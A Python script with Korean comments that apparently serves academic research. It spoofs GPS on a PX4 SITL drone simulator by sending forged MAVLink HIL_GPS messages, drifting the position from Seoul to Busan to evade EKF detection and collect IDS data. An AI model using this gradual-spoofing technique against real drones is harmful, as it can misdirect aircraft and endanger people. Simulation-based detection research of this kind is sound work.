#!/usr/bin/env python3
"""
SITL UDP GPS 스푸핑 - PX4 v1.14 + pymavlink 2.4.49
학술 연구용: GPS 스푸핑 시뮬레이션 및 IDS 데이터 수집
"""
import os
os.environ['MAVLINK20'] = '1'  # MAVLink 2 강제 활성화

import time
import math
from pymavlink import mavutil

class SITLGPSSpoofer:
    def __init__(self, connection_string='udpout:127.0.0.1:14540'):
        self.master = mavutil.mavlink_connection(
            connection_string,
            source_system=1,
            source_component=191
        )
        self.boot_time = time.time()
        self.original_lat = None
        self.original_lon = None
        self.original_alt = None
        
    def wait_heartbeat(self):
        """하트비트 대기 및 연결 확인"""
        print("하트비트 대기 중...")
        self.master.wait_heartbeat()
        print(f"연결됨: system {self.master.target_system}, component {self.master.target_component}")
        
    def get_safe_timestamp(self):
        """struct.error 방지를 위한 안전한 uint64 타임스탬프"""
        return int(time.time() * 1e6) & 0xFFFFFFFFFFFFFFFF
    
    def get_boot_timestamp_us(self):
        """부팅 후 경과 시간 (마이크로초)"""
        elapsed = time.time() - self.boot_time
        return max(0, int(elapsed * 1e6)) & 0xFFFFFFFFFFFFFFFF
    
    def send_hil_gps(self, lat_deg, lon_deg, alt_m, 
                     vn_ms=0.0, ve_ms=0.0, vd_ms=0.0,
                     fix_type=3, satellites=12):
        """
        HIL_GPS 메시지 송신 (struct.error 방지 완료)
        
        Args:
            lat_deg: 위도 (도 단위, 예: 37.5665)
            lon_deg: 경도 (도 단위, 예: 126.9780)
            alt_m: 고도 (미터, MSL 기준)
            vn_ms: 북쪽 속도 (m/s)
            ve_ms: 동쪽 속도 (m/s)
            vd_ms: 아래쪽 속도 (m/s)
        """
        # 단위 변환
        lat_e7 = int(lat_deg * 1e7)
        lon_e7 = int(lon_deg * 1e7)
        alt_mm = int(alt_m * 1000)
        
        # 속도 변환 (m/s → cm/s)
        vn_cms = int(vn_ms * 100)
        ve_cms = int(ve_ms * 100)
        vd_cms = int(vd_ms * 100)
        
        # 지상 속도 계산
        ground_speed_cms = int(math.sqrt(vn_ms**2 + ve_ms**2) * 100)
        
        # 진행 방향 계산 (cdeg)
        if vn_ms != 0 or ve_ms != 0:
            cog = int(math.degrees(math.atan2(ve_ms, vn_ms)) * 100) % 36000
        else:
            cog = 0
            
        self.master.mav.hil_gps_send(
            self.get_boot_timestamp_us(),  # time_usec (안전한 uint64)
            fix_type,                       # fix_type
            lat_e7,                         # lat (degE7)
            lon_e7,                         # lon (degE7)
            alt_mm,                         # alt (mm)
            100,                            # eph (1.0 HDOP * 100)
            100,                            # epv (1.0 VDOP * 100)
            ground_speed_cms,               # vel (cm/s)
            vn_cms,                         # vn (cm/s)
            ve_cms,                         # ve (cm/s)
            vd_cms,                         # vd (cm/s)
            cog,                            # cog (cdeg)
            satellites                      # satellites_visible
        )
        
    def gradual_spoof(self, target_lat, target_lon, target_alt,
                      duration_s=30, rate_hz=10):
        """
        점진적 GPS 스푸핑 (EKF 탐지 회피)
        
        Args:
            target_lat/lon/alt: 목표 가짜 위치
            duration_s: 스푸핑 소요 시간 (초)
            rate_hz: 메시지 전송 빈도 (Hz)
        """
        # 현재 위치 획득
        msg = self.master.recv_match(type='GPS_RAW_INT', blocking=True, timeout=5)
        if msg:
            self.original_lat = msg.lat / 1e7
            self.original_lon = msg.lon / 1e7
            self.original_alt = msg.alt / 1000
        else:
            print("현재 GPS 위치를 가져올 수 없음")
            return
            
        print(f"원본 위치: {self.original_lat:.7f}, {self.original_lon:.7f}, {self.original_alt:.1f}m")
        print(f"목표 위치: {target_lat:.7f}, {target_lon:.7f}, {target_alt:.1f}m")
        
        steps = int(duration_s * rate_hz)
        interval = 1.0 / rate_hz
        
        for i in range(steps + 1):
            progress = i / steps
            
            # 선형 보간
            current_lat = self.original_lat + (target_lat - self.original_lat) * progress
            current_lon = self.original_lon + (target_lon - self.original_lon) * progress
            current_alt = self.original_alt + (target_alt - self.original_alt) * progress
            
            self.send_hil_gps(current_lat, current_lon, current_alt)
            
            if i % (rate_hz * 5) == 0:  # 5초마다 상태 출력
                print(f"진행: {progress*100:.1f}% - 현재 위치: {current_lat:.7f}, {current_lon:.7f}")
                
            time.sleep(interval)
            
        print("스푸핑 완료")

def main():
    """SITL UDP 모드 실행"""
    print("=== SITL UDP GPS 스푸핑 시작 ===")
    print("사전 요구사항:")
    print("  1. param set SIM_GPS_BLOCK 1  # 시뮬레이터 GPS 차단")
    print("  2. param set MAV_USEHILGPS 1  # HIL GPS 허용")
    print()
    
    spoofer = SITLGPSSpoofer('udpout:127.0.0.1:14540')
    spoofer.wait_heartbeat()
    
    # 서울 → 부산 스푸핑 예시
    SEOUL_LAT, SEOUL_LON = 37.5665, 126.9780
    BUSAN_LAT, BUSAN_LON = 35.1796, 129.0756
    
    spoofer.gradual_spoof(
        target_lat=BUSAN_LAT,
        target_lon=BUSAN_LON,
        target_alt=100.0,
        duration_s=60,
        rate_hz=10
    )

if __name__ == "__main__":
    main()